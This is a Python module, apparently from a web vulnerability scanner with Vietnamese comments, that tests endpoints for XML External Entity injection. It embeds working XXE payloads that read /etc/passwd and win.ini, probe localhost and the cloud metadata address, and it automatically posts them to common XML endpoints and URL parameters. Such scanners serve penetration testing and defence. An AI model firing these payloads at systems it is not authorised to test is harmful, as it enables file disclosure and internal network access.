"""
xxe.py - XML External Entity (XXE) Injection scanner
Phát hiện XXE trong XML endpoints, file upload, SOAP services.
"""
import httpx
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from rich.console import Console

console = Console()

# XXE payloads
XXE_PAYLOADS = [
    # Classic XXE - đọc /etc/passwd
    ("""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>""", "linux_file"),

    # Windows
    ("""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">]>
<root><data>&xxe;</data></root>""", "windows_file"),

    # XXE via SSRF
    ("""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]>
<root><data>&xxe;</data></root>""", "ssrf"),

    # Blind XXE (out-of-band)
    ("""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/">%xxe;]>
<root/>""", "blind_oob"),

    # Parameter entity
    ("""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///dev/null'>">
  %eval;
  %exfil;
]>
<root/>""", "parameter_entity"),
]

# Endpoints thường nhận XML
XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/soap+xml",
    "application/xhtml+xml",
]

XML_ENDPOINTS = [
    "/api/xml",
    "/api/upload",
    "/api/import",
    "/xmlrpc.php",
    "/api/soap",
    "/ws",
    "/webservice",
    "/api/v1/xml",
    "/feed",
    "/rss",
    "/atom",
    "/sitemap.xml",
]

# Indicators trong response
XXE_LINUX_INDICATORS = [
    "root:x:0:0", "bin:x:1:1", "/bin/bash", "/bin/sh", "daemon:x:",
]
XXE_WINDOWS_INDICATORS = [
    "[extensions]", "[fonts]", "for 16-bit", "MAPI=1",
]
XXE_ERROR_INDICATORS = [
    "xml parsing", "xml syntax", "xml parse error",
    "entity", "doctype", "dtd", "external entity",
    "sax", "dom parsing",
]


class XXEScanner:
    def __init__(self, timeout: int = 10, config: dict | None = None):
        self.timeout = timeout
        self.config  = config or {}

    def _check_response(self, text: str, payload_type: str) -> tuple[bool, str, float]:
        lower = text.lower()

        if payload_type == "linux_file":
            for ind in XXE_LINUX_INDICATORS:
                if ind in text:
                    return True, f"XXE confirmed: /etc/passwd read ('{ind}')", 0.98

        elif payload_type == "windows_file":
            for ind in XXE_WINDOWS_INDICATORS:
                if ind in text:
                    return True, f"XXE confirmed: win.ini read ('{ind}')", 0.98

        elif payload_type == "ssrf":
            if any(x in lower for x in ["connection refused", "failed to connect",
                                         "no route to host"]):
                return True, "XXE via SSRF: server attempted internal connection", 0.78

        # Error disclosure
        for ind in XXE_ERROR_INDICATORS:
            if ind in lower:
                return True, f"XXE error disclosure: '{ind}' in response", 0.65

        return False, "", 0.0

    async def scan(self, base_url: str, client: httpx.AsyncClient) -> list[dict]:
        results = []
        base    = base_url.rstrip("/")

        # Test XML endpoints
        for path in XML_ENDPOINTS:
            url = base + path
            for payload, ptype in XXE_PAYLOADS[:3]:  # Test 3 payloads đầu
                for content_type in XML_CONTENT_TYPES[:2]:
                    try:
                        resp = await client.post(
                            url,
                            content=payload,
                            headers={"Content-Type": content_type},
                        )
                        hit, evidence, confidence = self._check_response(resp.text, ptype)
                        if hit:
                            console.print(
                                f"  [red bold][XXE][/red bold] {url} | type={ptype}"
                            )
                            results.append({
                                "type":        "XML External Entity (XXE) Injection",
                                "severity":    "CRITICAL",
                                "url":         url,
                                "parameter":   f"POST body ({content_type})",
                                "payload":     payload[:60] + "...",
                                "evidence":    evidence,
                                "confidence":  confidence,
                                "cvss_score":  9.1,
                                "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                                "cwe":         "CWE-611",
                            })
                            break
                    except Exception:
                        pass

        # Test URL params có thể nhận XML
        return results

    async def scan_url(self, url: str, client: httpx.AsyncClient) -> list[dict]:
        """Test nếu URL param nhận XML content."""
        results = []
        parsed  = urlparse(url)
        params  = parse_qs(parsed.query)

        xml_param_names = {"xml", "data", "body", "payload", "content", "input", "query"}
        candidate_params = [p for p in params if p.lower() in xml_param_names]

        for param in candidate_params:
            for payload, ptype in XXE_PAYLOADS[:2]:
                new_params = dict(params)
                new_params[param] = [payload]
                test_url = urlunparse(parsed._replace(
                    query=urlencode(new_params, doseq=True)
                ))
                try:
                    resp = await client.get(test_url)
                    hit, evidence, confidence = self._check_response(resp.text, ptype)
                    if hit:
                        results.append({
                            "type":        "XXE via URL Parameter",
                            "severity":    "CRITICAL",
                            "url":         url,
                            "parameter":   param,
                            "payload":     payload[:60] + "...",
                            "evidence":    evidence,
                            "confidence":  confidence,
                            "cvss_score":  9.1,
                            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                            "cwe":         "CWE-611",
                        })
                        break
                except Exception:
                    pass

        return results